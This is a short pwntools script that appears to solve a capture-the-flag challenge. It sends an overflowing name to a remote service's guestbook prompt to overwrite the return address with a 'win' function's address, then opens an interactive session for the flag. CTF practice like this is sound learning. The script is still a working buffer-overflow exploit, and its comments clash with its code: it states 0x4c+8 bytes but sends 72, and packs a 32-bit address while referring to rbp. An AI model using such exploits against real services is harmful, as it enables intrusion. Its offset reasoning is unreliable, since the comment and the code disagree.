from pwn import *

p = remote("crazy-casino.2025-bq.ctfcompetition.com", 1337)


p.recvuntil(b"Please sign the guestbook to leave (Enter Name): ")

#the buffer length is rbp-0x4c so in order to overwrite the return address we need to send 0x4c+8 bytes
payload = b"A" * 72
#the address of the win function is 0x08049a05
payload += p32(0x08049a05)
#send the payload
p.sendline(payload)
#it will cat the flag file
p.interactive()
